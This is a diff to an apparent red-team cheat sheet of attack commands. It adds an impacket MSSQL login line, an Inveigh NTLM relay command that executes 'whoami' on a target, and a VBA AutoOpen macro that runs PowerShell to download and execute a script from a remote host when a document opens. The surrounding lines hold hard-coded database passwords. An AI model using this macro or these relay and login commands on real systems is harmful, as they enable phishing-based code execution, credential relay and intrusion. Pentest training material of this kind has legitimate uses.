@@ -209,6 +209,9 @@ https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/
 [sqsh:mssql connect]
 sqsh -S 172.16.1.5 -U sophie -P 'TerrorInflictPurpleDirt996655'
 
+[impacket: mssqlclient]
+mssqlclient.py inception/svc_inventory:''@10.9.40.201 -windows-auth -debug
+
 [mysql connect and run commands in one liner]
 mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'show databases;'
 
@@ -903,3 +906,18 @@ Invoke-DNSUpdate -DNSType A -DNSName * -DNSData 192.168.21.123 -Verbose
 [Inveigh]
 Invoke-Inveigh -ConsoleOutput Y
 Invoke-Inveigh -FileOutput \windows\tasks\test.txt
+Invoke-InveighRelay -ConsoleOutput Y -Target 192.168.21.155 -Command "whoami" -Attack Enumerate,Execute,Session
+
+[VBA Macro]
+```
+Sub AutoOpen()
+    Start = "powershell.exe -Sta -NoP"
+    PSC = " -Command IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.123/test.ps1')"
+
+    FL = Start & PSC
+    
+	Dim MyObject As Object
+    Set MyObject = CreateObject("Wscript.Shell")
+    MyObject.Run (FL)
+End Sub
+```
